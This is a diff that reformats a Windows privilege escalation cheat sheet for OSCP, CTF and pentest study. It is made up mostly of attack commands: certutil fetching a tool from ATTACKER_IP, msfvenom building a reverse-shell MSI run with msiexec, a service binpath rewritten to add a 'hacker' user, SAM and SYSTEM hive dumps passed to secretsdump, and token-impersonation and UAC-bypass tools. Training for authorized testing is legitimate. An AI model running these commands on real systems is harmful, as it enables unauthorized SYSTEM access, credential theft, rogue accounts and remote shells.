@@ -1,7 +1,7 @@
 # Windows Privilege Escalation Cheat Sheet
-### Based on TryHackMe, HackTheBox, and OSCP Techniques
+Based on TryHackMe, HackTheBox, and OSCP Techniques
 
-Optimized for **OSCP / GPEN / CTF / Pentesting**
+Optimized for OSCP / GPEN / CTF / Pentesting
 
 ---
 
@@ -15,332 +15,501 @@ whoami /priv
 whoami /groups
 hostname
 systeminfo
-OS Version
+```
+
+## OS Version
+
+```powershell
 systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
-Network Information
+```
+
+## Network Information
+
+```powershell
 ipconfig /all
 route print
 netstat -ano
-2. Automated Enumeration Tools
+```
+
+---
+
+# 2. Automated Enumeration Tools
 
 Run automated tools early.
 
 Common tools:
 
-winPEAS
-
-Seatbelt
-
-PowerUp
-
-SharpUp
-
-Watson
-
-Windows Exploit Suggester
+- winPEAS
+- Seatbelt
+- PowerUp
+- SharpUp
+- Watson
+- Windows Exploit Suggester
 
 Example:
 
+```powershell
 winPEAS.exe
+```
 
-Upload example:
+Upload tool:
 
+```bash
 python3 -m http.server 8000
+```
 
 Download on target:
 
-certutil -urlcache -f http://attacker/winpeas.exe winpeas.exe
-3. User Enumeration
+```powershell
+certutil -urlcache -f http://ATTACKER_IP/winpeas.exe winpeas.exe
+```
+
+---
+
+# 3. User Enumeration
+
+```powershell
 net user
 net user username
+```
 
 List administrators:
 
+```powershell
 net localgroup administrators
+```
 
 Current user:
 
+```powershell
 whoami
-4. Check Privileges
+```
+
+---
+
+# 4. Check Privileges
+
+```powershell
 whoami /priv
+```
 
 Important privileges:
 
-SeImpersonatePrivilege
-SeAssignPrimaryTokenPrivilege
-SeBackupPrivilege
-SeRestorePrivilege
-SeTakeOwnershipPrivilege
-SeDebugPrivilege
+- SeImpersonatePrivilege
+- SeAssignPrimaryTokenPrivilege
+- SeBackupPrivilege
+- SeRestorePrivilege
+- SeTakeOwnershipPrivilege
+- SeDebugPrivilege
 
-If you see SeImpersonatePrivilege, you may use:
+If SeImpersonatePrivilege exists, possible exploits:
 
-JuicyPotato
-
-PrintSpoofer
-
-RoguePotato
+- JuicyPotato
+- PrintSpoofer
+- RoguePotato
+- GodPotato
 
 Example:
 
+```powershell
 PrintSpoofer.exe -i -c cmd
-5. Unquoted Service Paths
+```
+
+---
+
+# 5. Unquoted Service Paths
 
 List services:
 
+```powershell
 wmic service get name,displayname,pathname,startmode
+```
 
-Look for:
+Example vulnerable path:
 
+```
 C:\Program Files\Some Service\service.exe
+```
 
-If unquoted and writable:
+If unquoted, Windows searches:
 
+```
 C:\Program.exe
-
-Exploit by placing malicious binary.
+```
 
 Check permissions:
 
+```powershell
 icacls "C:\Program Files\Some Service"
-6. Weak Service Permissions
+```
 
-Find service permissions:
+If writable → place malicious binary.
 
-accesschk.exe -uwcqv "Authenticated Users" *
+---
 
-Check if you can modify service:
+# 6. Weak Service Permissions
 
+Check service configuration:
+
+```powershell
 sc qc service_name
+```
+
+Find modifiable services:
+
+```powershell
+accesschk.exe -uwcqv "Authenticated Users" *
+```
 
 Modify service:
 
-sc config service_name binpath= "cmd /c net user hacker password /add"
+```powershell
+sc config service_name binpath= "cmd /c net user hacker password123 /add"
+```
 
 Restart service:
 
+```powershell
 sc stop service_name
 sc start service_name
-7. AlwaysInstallElevated
+```
+
+---
+
+# 7. AlwaysInstallElevated
 
 Check registry:
 
+```powershell
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+```
 
-If both:
+If both show:
 
+```
 AlwaysInstallElevated = 1
+```
 
 Create malicious MSI:
 
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f msi > shell.msi
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi > shell.msi
+```
 
-Run:
+Execute:
 
+```powershell
 msiexec /quiet /qn /i shell.msi
-8. Stored Credentials
+```
 
-Search for credentials:
+---
 
+# 8. Stored Credentials
+
+List stored credentials:
+
+```powershell
 cmdkey /list
+```
 
 Use stored credentials:
 
+```powershell
 runas /savecred /user:administrator cmd
+```
 
 Search files:
 
-dir /s *pass* == *cred* == *vnc* == *.config*
-9. Scheduled Tasks
+```powershell
+dir /s *pass*
+dir /s *cred*
+```
+
+---
+
+# 9. Scheduled Tasks
 
 List tasks:
 
+```powershell
 schtasks /query /fo LIST /v
+```
 
-Check writable scripts used in tasks.
+Look for:
 
-10. Registry Privilege Escalation
+- Writable scripts
+- Tasks running as SYSTEM
+
+---
+
+# 10. Registry Privilege Escalation
 
 Check autoruns:
 
+```powershell
 reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
 reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+```
 
-If writable path → replace binary.
+Replace binary if path writable.
 
-11. Startup Applications
+---
 
-Check startup folder:
+# 11. Startup Applications
 
+Startup folder:
+
+```
 C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
+```
 
-If writable:
+If writable → place malicious executable.
 
-Place malicious executable.
+---
 
-12. DLL Hijacking
-
-If application loads missing DLL.
-
-Tools:
-
-Procmon
-
-winPEAS
+# 12. DLL Hijacking
 
 Steps:
 
-Identify missing DLL
+1. Identify application loading missing DLL
+2. Create malicious DLL
+3. Place DLL in writable directory
 
-Create malicious DLL
+Tools:
 
-Place DLL in writable directory
+- Procmon
+- winPEAS
 
-13. Writable Services
+---
+
+# 13. Writable Services
 
 Check service:
 
+```powershell
 sc qc service_name
+```
 
 Check permissions:
 
+```powershell
 icacls "C:\Program Files\Service"
+```
 
 Replace binary if writable.
 
-14. Token Impersonation
+---
+
+# 14. Token Impersonation
 
 If privilege exists:
 
+```
 SeImpersonatePrivilege
-
-Use tools:
-
-JuicyPotato
-PrintSpoofer
-RoguePotato
-GodPotato
-
-Example:
-
-PrintSpoofer.exe -i -c cmd
-15. Weak Folder Permissions
-
-Find writable directories:
-
-accesschk.exe -uws "Everyone" C:\
-
-or
-
-icacls C:\Program Files
-16. Password Hunting
-
-Search registry:
-
-reg query HKLM /f password /t REG_SZ /s
-
-Search files:
-
-findstr /si password *.txt *.ini *.config *.xml
-17. SAM and SYSTEM Extraction
-
-If you have backup privilege:
-
-SeBackupPrivilege
-
-Dump SAM:
-
-reg save HKLM\SAM sam.hive
-reg save HKLM\SYSTEM system.hive
-
-Extract hashes:
-
-secretsdump.py -sam sam.hive -system system.hive LOCAL
-18. UAC Bypass
-
-Check UAC level:
-
-reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System
-
-Common techniques:
-
-fodhelper
-
-eventvwr
-
-sdclt
-
-Example:
-
-fodhelper.exe
-19. Kernel Exploits
-
-Check system patches:
-
-systeminfo
+```
 
 Use:
 
-Windows Exploit Suggester
-Watson
-Sherlock
+- JuicyPotato
+- PrintSpoofer
+- RoguePotato
+- GodPotato
+
+Example:
+
+```powershell
+PrintSpoofer.exe -i -c cmd
+```
+
+---
+
+# 15. Weak Folder Permissions
+
+Check permissions:
+
+```powershell
+icacls C:\Program Files
+```
+
+Using AccessChk:
+
+```powershell
+accesschk.exe -uws "Everyone" C:\
+```
+
+---
+
+# 16. Password Hunting
+
+Search registry:
+
+```powershell
+reg query HKLM /f password /t REG_SZ /s
+```
+
+Search files:
+
+```powershell
+findstr /si password *.txt *.ini *.config *.xml
+```
+
+---
+
+# 17. SAM and SYSTEM Extraction
+
+If SeBackupPrivilege exists:
+
+```powershell
+reg save HKLM\SAM sam.hive
+reg save HKLM\SYSTEM system.hive
+```
+
+Extract hashes:
+
+```bash
+secretsdump.py -sam sam.hive -system system.hive LOCAL
+```
+
+---
+
+# 18. UAC Bypass
+
+Check UAC:
+
+```powershell
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System
+```
+
+Common bypasses:
+
+- fodhelper
+- eventvwr
+- sdclt
+
+Example:
+
+```powershell
+fodhelper.exe
+```
+
+---
+
+# 19. Kernel Exploits
+
+Check patches:
+
+```powershell
+systeminfo
+```
+
+Tools:
+
+- Windows Exploit Suggester
+- Watson
+- Sherlock
 
 Example exploit:
 
+```
 MS16-032
-20. Quick PrivEsc Checklist (Exam Mode)
+```
+
+---
+
+# 20. Quick PrivEsc Checklist (Exam Mode)
+
 Step 1
+
+```powershell
 whoami
 whoami /priv
+```
+
 Step 2
+
+```powershell
 systeminfo
+```
+
 Step 3
 
-Run enumeration tool:
-
+```powershell
 winPEAS.exe
+```
+
 Step 4
 
-Check services:
-
+```powershell
 wmic service get name,pathname
+```
+
 Step 5
 
-Check scheduled tasks:
-
+```powershell
 schtasks /query /fo LIST /v
+```
+
 Step 6
 
-Check registry:
-
+```powershell
 reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+```
+
 Step 7
 
-Search credentials:
-
+```powershell
 cmdkey /list
+```
+
 Step 8
 
-Check AlwaysInstallElevated:
-
+```powershell
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
-21. Common PrivEsc Tools
-Enumeration
-winPEAS
-Seatbelt
-PowerUp
-SharpUp
-Sherlock
-Watson
-Exploitation
-JuicyPotato
-PrintSpoofer
-RoguePotato
-GodPotato
-22. Useful File Locations
+```
+
+---
+
+# 21. Common PrivEsc Tools
+
+Enumeration:
+
+- winPEAS
+- Seatbelt
+- PowerUp
+- SharpUp
+- Sherlock
+- Watson
+
+Exploitation:
+
+- JuicyPotato
+- PrintSpoofer
+- RoguePotato
+- GodPotato
+
+---
+
+# 22. Useful File Locations
+
+```
 C:\Windows\System32\config
 C:\Program Files
 C:\ProgramData
 C:\Users\*\AppData
 C:\Windows\Tasks
+```
+
+---
+
+# 23. Privilege Escalation Reasoning Model
+
+Ask:
+
+1. Who am I?
+2. What privileges do I have?
+3. What services run as SYSTEM?
+4. Can I modify any binaries or scripts?
+5. Are there stored credentials?
+
+This structured reasoning helps identify escalation paths quickly.
